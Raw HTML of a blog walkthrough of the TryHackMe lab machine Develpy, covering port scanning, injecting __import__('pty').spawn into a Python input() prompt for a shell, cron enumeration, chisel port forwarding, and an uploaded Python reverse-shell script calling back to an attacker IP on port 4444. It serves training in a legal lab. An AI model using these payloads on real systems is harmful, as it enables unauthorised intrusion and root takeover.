<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TryHackMe - Develpy | Umar_0x01 â€“ Pentester | Programmer | Your average sakurity guy ( Í¡~ ÍœÊ– Í¡Â°)</title><meta name=keywords content="ssh,python,python-input,cronjobs,bash,port-forwarding,file-upload,python-shell"><meta name=description content="Walkthrough of the boot2root machine Develpy on TryHackMe - https://tryhackme.com/room/develpy"><meta name=author content="Umar_0x01"><link rel=canonical href=https://umar0x01.sh/post/tryhackme-develpy/><meta name=google-site-verification content="GTM-TZKBTKP"><link crossorigin=anonymous href=/assets/css/stylesheet.min.59f065735d47f1e8b3aab68fc9c773b722b5adf3f4e6096c42e8a1f8db8b3822.css integrity="sha256-WfBlc11H8eizqraPycdztyK1rfP05glsQuih+NuLOCI=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://umar0x01.sh/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://umar0x01.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://umar0x01.sh/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://umar0x01.sh/favicon/apple-touch-icon.png><link rel=mask-icon href=https://umar0x01.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.82.0"><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-177361132-1','auto'),ga('send','pageview'))</script><meta property="og:title" content="TryHackMe - Develpy"><meta property="og:description" content="Walkthrough of the boot2root machine Develpy on TryHackMe - https://tryhackme.com/room/develpy"><meta property="og:type" content="article"><meta property="og:url" content="https://umar0x01.sh/post/tryhackme-develpy/"><meta property="og:image" content="https://umar0x01.sh/images/tryhackme-develpy/Untitled%201.png"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-04-23T00:00:00+00:00"><meta property="article:modified_time" content="2021-04-23T00:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://umar0x01.sh/images/tryhackme-develpy/Untitled%201.png"><meta name=twitter:title content="TryHackMe - Develpy"><meta name=twitter:description content="Walkthrough of the boot2root machine Develpy on TryHackMe - https://tryhackme.com/room/develpy"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://umar0x01.sh/post/"},{"@type":"ListItem","position":3,"name":"TryHackMe - Develpy","item":"https://umar0x01.sh/post/tryhackme-develpy/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe - Develpy","name":"TryHackMe - Develpy","description":"Walkthrough of the boot2root machine Develpy on TryHackMe - https://tryhackme.com/room/develpy","keywords":["ssh","python","python-input","cronjobs","bash","port-forwarding","file-upload","python-shell"],"articleBody":"Develpy Enumeration  Link: https://tryhackme.com/room/bsidesgtdevelpy\nAuthor: https://tryhackme.com/p/stuxnet\nHost: 10.10.36.158\n Letâ€™s start with a rustscan again the machine (as always) to quickly enumerate open ports.\nâ”Œâ”€â”€(rootðŸ’€b0x)-[~/THM/Develpy] â””â”€# rustscan -a 10.10.36.158 --ulimit 5000 -b 4500 -- -sC -sV The Modern Day Port Scanner. ________________________________________ : https://discord.gg/GFrQsGy : : https://github.com/RustScan/RustScan : -------------------------------------- Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan [~] The config file is expected to be at \"/root/.rustscan.toml\" [~] Automatically increasing ulimit value to 5000. Open 10.10.36.158:22 Open 10.10.36.158:10000 [~] Starting Script(s) [] Script to be run Some(\"nmap -vvv -p {{port}} {{ip}}\") ... PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDeAB1tAGCfeGkiBXodMGeCc6prI2xaWz/fNRhwusVEujBTQ1BdY3BqPHNf1JLGhqts1anfY9ydt0N1cdAEv3L16vH2cis+34jyek3d+TVp+oBLztNWY5Yfcv/3uRcy5yyZsKjMz+wyribpEFlbpvscrVYfI2Crtm5CgcaSwqDDt c1doeABJ9t3iSv+7MKBdWJ9N3xd/oTfI0fEOdIp8M568A1/CJEQINFPVu1txC/HTiY4jmVkNf6+JyJfFqshRMpFq2YmUi6GulwzWQONmbTyxqrZg2y+y2q1AuFeritRg9vvkBInW0x18FS8KLdy5ohoXgeoWsznpR1J/BzkNfap | 256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDGGFFv4aQm/+j6R2Vsg96zpBowtu0/pkUxksqjTqKhAFtHla6LE0BRJtSYgmm8+ItlKHjJX8DNYylnNDG+Ol/U= | 256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMbypBoQ33EbivAc05LqKzxLsJrTgXOrXG7qG/RoO30K 10000/tcp open snet-sensor-mgmt? syn-ack ttl 60 | fingerprint-strings: | GenericLines: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \"./exploit.py\", line 6, in  | num_exploits = int(input(' Please enther number of exploits to send??: ')) | File \"\", line 0 | SyntaxError: unexpected EOF while parsing | GetRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \"./exploit.py\", line 6, in  | num_exploits = int(input(' Please enther number of exploits to send??: ')) | File \"\", line 1, in  | NameError: name 'GET' is not defined | HTTPOptions, RTSPRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \"./exploit.py\", line 6, in  | num_exploits = int(input(' Please enther number of exploits to send??: ')) | File \"\", line 1, in  | NameError: name 'OPTIONS' is not defined | NULL: | Private 0days |_ Please enther number of exploits to send??: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port10000-TCP:V=7.91%I=7%D=4/23%Time=6082A08F%P=x86_64-pc-linux-gnu%r(N SF:ULL,48,\"\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Private\\x200days\\r\\n\\r\\n\\x2 SF:0Please\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20\")% SF:r(GetRequest,136,\"\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Private\\x200days\\ SF:r\\n\\r\\n\\x20Please\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\? SF:\\?:\\x20Traceback\\x20\\(most\\x20recent\\x20call\\x20last\\):\\r\\n\\x20\\x20File SF:\\x20\\\"\\./exploit\\.py\\\",\\x20line\\x206,\\x20in\\x20\\r\\n\\x20\\x20\\x20 SF:\\x20num_exploits\\x20=\\x20int\\(input\\('\\x20Please\\x20enther\\x20number\\x2 SF:0of\\x20exploits\\x20to\\x20send\\?\\?:\\x20'\\)\\)\\r\\n\\x20\\x20File\\x20\\\"SF:g\\\",\\x20line\\x201,\\x20in\\x20\\r\\nNameError:\\x20name\\x20'GET'\\x2 SF:0is\\x20not\\x20defined\\r\\n\")%r(HTTPOptions,13A,\"\\r\\n\\x20\\x20\\x20\\x20\\x20 ... \nInteresting stuff, it seems thereâ€™s a service listening on port 10000/tcp on the host which is running a python script on its backend. Letâ€™s check it out. Port 10000 - Python Server Letâ€™s try connecting to it with nc\nâ”Œâ”€â”€(rootðŸ’€b0x)-[~/THM/Develpy] â””â”€# nc 10.10.36.158 10000 Private 0days Please enther number of exploits to send??: ls Traceback (most recent call last): File \"./exploit.py\", line 6, in  num_exploits = int(input(' Please enther number of exploits to send??: ')) File \"\", line 1, in  NameError: name 'ls' is not defined \nWe can see that itâ€™s calling input function on the input recieved by the user. Thereâ€™s an exploitation guide out there on this, Iâ€™ll leave it to you to research that, Iâ€™ll still manually go through the exploitation phase rather than copy/pasting the final one-liner for command execution.\nLetâ€™s try sending what itâ€™s expecting, a number!\nâ”Œâ”€â”€(rootðŸ’€b0x)-[~/THM/Develpy] â””â”€# nc 10.10.36.158 10000 Private 0days Please enther number of exploits to send??: 2 Exploit started, attacking target (tryhackme.com)... Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.074 ms Exploiting tryhackme internal network: beacons_seq=2 ttl=1337 time=0.08 ms \nSending 2, we can see that itâ€™s pinging tryhackme.com host against the number two times (because of 2?). Letâ€™s try passing 2+2 and see if it evaluates that (to 4)?\nâ”Œâ”€â”€(rootðŸ’€b0x)-[~/THM/Develpy] â””â”€# nc 10.10.36.158 10000 Private 0days Please enther number of exploits to send??: 2+2 Exploit started, attacking target (tryhackme.com)... Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.034 ms Exploiting tryhackme internal network: beacons_seq=2 ttl=1337 time=0.088 ms Exploiting tryhackme internal network: beacons_seq=3 ttl=1337 time=0.014 ms Exploiting tryhackme internal network: beacons_seq=4 ttl=1337 time=0.019 ms \nAwesome! 4 tries now! Maybe try something like printing something?\nâ”Œâ”€â”€(rootðŸ’€b0x)-[~/THM/Develpy] â””â”€# nc 10.10.36.158 10000 Private 0days Please enther number of exploits to send??: print(1) Traceback (most recent call last): File \"./exploit.py\", line 6, in  num_exploits = int(input(' Please enther number of exploits to send??: ')) File \"\", line 1 print(1) ^ SyntaxError: invalid syntax \nPassing that, we get the above error^ Letâ€™s try passing a string:\nâ”Œâ”€â”€(rootðŸ’€b0x)-[~/THM/Develpy] â””â”€# nc 10.10.36.158 10000 Private 0days Please enther number of exploits to send??: test Traceback (most recent call last): File \"./exploit.py\", line 6, in  num_exploits = int(input(' Please enther number of exploits to send??: ')) File \"\", line 1, in  NameError: name 'test' is not defined \nThe error \"NameError: name 'test' is not defined\" only occurs when some module or variable is being called! Letâ€™s try and import a module?\nâ”Œâ”€â”€(rootðŸ’€b0x)-[~/THM/Develpy] â””â”€# nc 10.10.36.158 10000 Private 0days Please enther number of exploits to send??: import os Traceback (most recent call last): File \"./exploit.py\", line 6, in  num_exploits = int(input(' Please enther number of exploits to send??: ')) File \"\", line 1 import os ^ SyntaxError: invalid syntax Exploitation Most probably spaces are the issue here! Letâ€™s try and import the module pty without spaces and call its method spawn to spawn a /bin/bash shell. We can find a guide here to do so.\n__import__('pty').spawn(\"/bin/bash\") \nLet's send it to the `server`: â”Œâ”€â”€(rootðŸ’€b0x)-[~/THM/Develpy] â””â”€# nc 10.10.36.158 10000 Private 0days Please enther number of exploits to send??: __import__('pty').spawn(\"/bin/bash\") king@ubuntu:~$ id id uid=1000(king) gid=1000(king) groups=1000(king),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare) \nAwesome! We've gotten the `initial` shell as user **king**. Privileges Escalation Now, for privileges escalation, we can see 2 .sh files in the user directory. Letâ€™s go through their contents:\nroot.sh\nking@ubuntu:~$ cat root.sh python /root/company/media/*.py run.sh\nking@ubuntu:~$ cat run.sh #!/bin/bash kill cat /home/king/.pid socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0 \u0026 echo $!  /home/king/.pid \nAlright, so root.sh is owned and only readable/writeable by root while we can read/write to run.sh which is no good since it is the server which was calling the python service we exploited to get the interactive shell.\nEnumerating more, we can see the cronjobs in the machine:\nking@ubuntu:~$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026\u0026 run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.monthly ) * * * * * king cd /home/king/ \u0026\u0026 bash run.sh * * * * * root cd /home/king/ \u0026\u0026 bash root.sh * * * * * root cd /root/company \u0026\u0026 bash run.sh # \nWe can see that **run.sh is being run as king** while **root.sh in our directory and run.sh in root userâ€™s company directory is being called by user root**. But how to access those? We donâ€™t have read access to /root/ either!\nEnumerating even more, we can see that thereâ€™s a port 8080/tcp listening locally:\nking@ubuntu:~$ netstat -plnt (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:10000 0.0.0.0:* LISTEN 756/socat tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - \nCool, we can forward this port to our host and access it using chisel. Letâ€™s do it!\nIâ€™ll leave the downloading and pushing of chisel binary to you. Weâ€™ll need a local copy of chisel on our host (attcker) depending on our OS and a copy of chisel compiled for x64 for the server (victim).\nVictim:\nking@ubuntu:~$ ./chisel-umar0x01 server -p 47000 Attacker:\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/var/www/html] â””â”€# ./chisel-umar0x01 client 10.10.36.158:47000 2222:127.0.0.1:8080 130 â¨¯ \nAwesome, letâ€™s run and see if our connection establishes.\nCool, the port is forwarded, let' try accessing it locally at 127.0.0.1:2222\nWeâ€™ve a upload page here, remember the contents of root.sh file in our directory? It was calling *.py files from **root user's media directory**, maybe we can upload our .py file here and get reverse shell as root user? Letâ€™s try that!\nIâ€™ll first add the following in my local python file for reverse shell:\nâ”Œâ”€â”€(rootðŸ’€b0x)-[~/THM/Develpy] â””â”€# cat  test.py import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\"10.17.0.120\",4444)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call([\"/bin/bash\",\"-i\"]) Letâ€™s upload the test.py file now to the server:\nLetâ€™s start the local listener and wait for a minute:\nAwesome! `Weâ€™re root! Thanks for reading the walkthrough. Hopefully you enjoyed it ðŸ¥‚\n Todos (Things learnt):  Enumerate manually before running any noisy local enumeration tool Think outside the box Never hesitate to forward ports (thinking itâ€™ll take time)!  ","wordCount":"1450","inLanguage":"en","image":"https://umar0x01.sh/images/tryhackme-develpy/Untitled%201.png","datePublished":"2021-04-23T00:00:00Z","dateModified":"2021-04-23T00:00:00Z","author":{"@type":"Person","name":"Umar_0x01"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://umar0x01.sh/post/tryhackme-develpy/"},"publisher":{"@type":"Organization","name":"Umar_0x01 â€“ Pentester | Programmer | Your average sakurity guy ( Í¡~ ÍœÊ– Í¡Â°)","logo":{"@type":"ImageObject","url":"https://umar0x01.sh/favicon/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style></noscript><header class=header><nav class=nav><div class=logo><a class=label_text_header href=https://umar0x01.sh accesskey=h title="> umar_0x01 | blog (Alt + H)"><span id=cusor_blink>></span> umar_0x01 | blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://umar0x01.sh/archives/ title=Posts><span>Posts</span></a></li><li><a href=https://umar0x01.sh/anime/ title=Anime><span>Anime</span></a></li><li><a href=https://umar0x01.sh/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://umar0x01.sh/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://umar0x01.sh/tags/ title=Tags><span>Tags</span></a></li></ul></nav><script type=text/javascript>var cursor=!0,speed=500;setInterval(()=>{cursor?(document.getElementById('cusor_blink').style.opacity=0,cursor=!1):(document.getElementById('cusor_blink').style.opacity=1,cursor=!0)},speed)</script></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://umar0x01.sh>Home</a>&nbsp;Â»&nbsp;<a href=https://umar0x01.sh/post/>Posts</a></div><h1 class=post-title>TryHackMe - Develpy</h1><div class=post-description>Walkthrough of the boot2root machine Develpy on TryHackMe - https://tryhackme.com/room/develpy</div><div class=post-meta>April 23, 2021&nbsp;Â·&nbsp;7 min&nbsp;Â·&nbsp;Umar_0x01</div></header><div class=post-content><h1 id=develpy>Develpy<a hidden class=anchor aria-hidden=true href=#develpy>#</a></h1><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><hr><p><strong>Link:</strong> <a href=https://tryhackme.com/room/bsidesgtdevelpy>https://tryhackme.com/room/bsidesgtdevelpy</a></p><p><strong>Author:</strong> <a href=https://tryhackme.com/p/stuxnet>https://tryhackme.com/p/stuxnet</a></p><p><strong>Host:</strong> 10.10.36.158</p><hr><p>Let&rsquo;s start with a <code>rustscan</code> again the machine (as always) to quickly <code>enumerate</code> <em>open ports</em>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>â”Œâ”€â”€<span style=color:#f92672>(</span>rootðŸ’€b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/THM/Develpy<span style=color:#f92672>]</span>       
â””â”€# rustscan -a 10.10.36.158 --ulimit <span style=color:#ae81ff>5000</span> -b <span style=color:#ae81ff>4500</span> -- -sC -sV                                               
The Modern Day Port Scanner.                                                                             
________________________________________                                                                 
: https://discord.gg/GFrQsGy           :                                                                 
: https://github.com/RustScan/RustScan :                                                                 
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span> The config file is expected to be at <span style=color:#e6db74>&#34;/root/.rustscan.toml&#34;</span>
<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span> Automatically increasing ulimit value to 5000.
Open 10.10.36.158:22
Open 10.10.36.158:10000
<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span> Starting Script<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>&gt;<span style=color:#f92672>]</span> Script to be run Some<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;nmap -vvv -p {{port}} {{ip}}&#34;</span><span style=color:#f92672>)</span>

...

PORT      STATE SERVICE           REASON         VERSION
22/tcp    open  ssh               syn-ack ttl <span style=color:#ae81ff>60</span> OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>2048</span> 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDeAB1tAGCfeGkiBXodMGeCc6prI2xaWz/fNRhwusVEujBTQ1BdY3BqPHNf1JLGhqts1anfY9ydt0N1cdAEv3L16vH2cis+34jyek3d+TVp+oBLztNWY5Yfcv/3uRcy5yyZsKjMz+wyribpEFlbpvscrVYfI2Crtm5CgcaSwqDDt
c1doeABJ9t3iSv+7MKBdWJ9N3xd/oTfI0fEOdIp8M568A1/CJEQINFPVu1txC/HTiY4jmVkNf6+JyJfFqshRMpFq2YmUi6GulwzWQONmbTyxqrZg2y+y2q1AuFeritRg9vvkBInW0x18FS8KLdy5ohoXgeoWsznpR1J/BzkNfap
|   <span style=color:#ae81ff>256</span> 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDGGFFv4aQm/+j6R2Vsg96zpBowtu0/pkUxksqjTqKhAFtHla6LE0BRJtSYgmm8+ItlKHjJX8DNYylnNDG+Ol/U<span style=color:#f92672>=</span>
|   <span style=color:#ae81ff>256</span> e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMbypBoQ33EbivAc05LqKzxLsJrTgXOrXG7qG/RoO30K
10000/tcp open  snet-sensor-mgmt? syn-ack ttl <span style=color:#ae81ff>60</span>
| fingerprint-strings: 
|   GenericLines: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback <span style=color:#f92672>(</span>most recent call last<span style=color:#f92672>)</span>:
|     File <span style=color:#e6db74>&#34;./exploit.py&#34;</span>, line 6, in &lt;module&gt;
|     num_exploits <span style=color:#f92672>=</span> int<span style=color:#f92672>(</span>input<span style=color:#f92672>(</span><span style=color:#e6db74>&#39; Please enther number of exploits to send??: &#39;</span><span style=color:#f92672>))</span>
|     File <span style=color:#e6db74>&#34;&lt;string&gt;&#34;</span>, line <span style=color:#ae81ff>0</span>
|     SyntaxError: unexpected EOF <span style=color:#66d9ef>while</span> parsing
|   GetRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback <span style=color:#f92672>(</span>most recent call last<span style=color:#f92672>)</span>:
|     File <span style=color:#e6db74>&#34;./exploit.py&#34;</span>, line 6, in &lt;module&gt;
|     num_exploits <span style=color:#f92672>=</span> int<span style=color:#f92672>(</span>input<span style=color:#f92672>(</span><span style=color:#e6db74>&#39; Please enther number of exploits to send??: &#39;</span><span style=color:#f92672>))</span>
|     File <span style=color:#e6db74>&#34;&lt;string&gt;&#34;</span>, line 1, in &lt;module&gt;
|     NameError: name <span style=color:#e6db74>&#39;GET&#39;</span> is not defined
|   HTTPOptions, RTSPRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback <span style=color:#f92672>(</span>most recent call last<span style=color:#f92672>)</span>:
|     File <span style=color:#e6db74>&#34;./exploit.py&#34;</span>, line 6, in &lt;module&gt;
|     num_exploits <span style=color:#f92672>=</span> int<span style=color:#f92672>(</span>input<span style=color:#f92672>(</span><span style=color:#e6db74>&#39; Please enther number of exploits to send??: &#39;</span><span style=color:#f92672>))</span>
|     File <span style=color:#e6db74>&#34;&lt;string&gt;&#34;</span>, line 1, in &lt;module&gt;
|     NameError: name <span style=color:#e6db74>&#39;OPTIONS&#39;</span> is not defined
|   NULL: 
|     Private 0days
|_    Please enther number of exploits to send??:
<span style=color:#ae81ff>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V<span style=color:#f92672>=</span>7.91%I<span style=color:#f92672>=</span>7%D<span style=color:#f92672>=</span>4/23%Time<span style=color:#f92672>=</span>6082A08F%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu%r<span style=color:#f92672>(</span>N
SF:ULL,48,<span style=color:#e6db74>&#34;\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\n\x2
</span><span style=color:#e6db74>SF:0Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20&#34;</span><span style=color:#f92672>)</span>%
SF:r<span style=color:#f92672>(</span>GetRequest,136,<span style=color:#e6db74>&#34;\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\
</span><span style=color:#e6db74>SF:r\n\r\n\x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?
</span><span style=color:#e6db74>SF:\?:\x20Traceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File
</span><span style=color:#e6db74>SF:\x20\&#34;\./exploit\.py\&#34;,\x20line\x206,\x20in\x20&lt;module&gt;\r\n\x20\x20\x20
</span><span style=color:#e6db74>SF:\x20num_exploits\x20=\x20int\(input\(&#39;\x20Please\x20enther\x20number\x2
</span><span style=color:#e6db74>SF:0of\x20exploits\x20to\x20send\?\?:\x20&#39;\)\)\r\n\x20\x20File\x20\&#34;&lt;strin
</span><span style=color:#e6db74>SF:g&gt;\&#34;,\x20line\x201,\x20in\x20&lt;module&gt;\r\nNameError:\x20name\x20&#39;GET&#39;\x2
</span><span style=color:#e6db74>SF:0is\x20not\x20defined\r\n&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>HTTPOptions,13A,<span style=color:#e6db74>&#34;\r\n\x20\x20\x20\x20\x20
</span><span style=color:#e6db74>...
</span></code></pre></div><br><p>Interesting stuff, it seems there&rsquo;s a <strong>service listening</strong> on <code>port 10000/tcp</code> on the host which is running a <code>python script</code> on its backend. Let&rsquo;s check it out.<br></p><h3 id=port-10000---python-server>Port 10000 - Python Server<a hidden class=anchor aria-hidden=true href=#port-10000---python-server>#</a></h3><p>Let&rsquo;s try connecting to it with <code>nc</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>â”Œâ”€â”€<span style=color:#f92672>(</span>rootðŸ’€b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/THM/Develpy<span style=color:#f92672>]</span>                      
â””â”€# nc 10.10.36.158 <span style=color:#ae81ff>10000</span>                                                                                                                                                                                          
                                                    
        Private 0days                          
                                                                                                         
 Please enther number of exploits to send??: ls
Traceback <span style=color:#f92672>(</span>most recent call last<span style=color:#f92672>)</span>:                                                                       
  File <span style=color:#e6db74>&#34;./exploit.py&#34;</span>, line 6, in &lt;module&gt;
    num_exploits <span style=color:#f92672>=</span> int<span style=color:#f92672>(</span>input<span style=color:#f92672>(</span><span style=color:#e6db74>&#39; Please enther number of exploits to send??: &#39;</span><span style=color:#f92672>))</span>
  File <span style=color:#e6db74>&#34;&lt;string&gt;&#34;</span>, line 1, in &lt;module&gt;              
NameError: name <span style=color:#e6db74>&#39;ls&#39;</span> is not defined
</code></pre></div><br><p>We can see that it&rsquo;s calling <code>input</code> function on the <em>input recieved by the user</em>. There&rsquo;s an <code>exploitation guide</code> out there on this, I&rsquo;ll leave it to you to research that, I&rsquo;ll still manually go through the <code>exploitation phase</code> rather than copy/pasting the final <code>one-liner</code> for <code>command execution</code>.</p><p>Let&rsquo;s try sending what it&rsquo;s expecting, a <code>number</code>!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>â”Œâ”€â”€<span style=color:#f92672>(</span>rootðŸ’€b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/THM/Develpy<span style=color:#f92672>]</span>
â””â”€# nc 10.10.36.158 <span style=color:#ae81ff>10000</span>

        Private 0days

 Please enther number of exploits to send??: <span style=color:#ae81ff>2</span>

Exploit started, attacking target <span style=color:#f92672>(</span>tryhackme.com<span style=color:#f92672>)</span>...
Exploiting tryhackme internal network: beacons_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>1337</span> time<span style=color:#f92672>=</span>0.074 ms
Exploiting tryhackme internal network: beacons_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span> ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>1337</span> time<span style=color:#f92672>=</span>0.08 ms
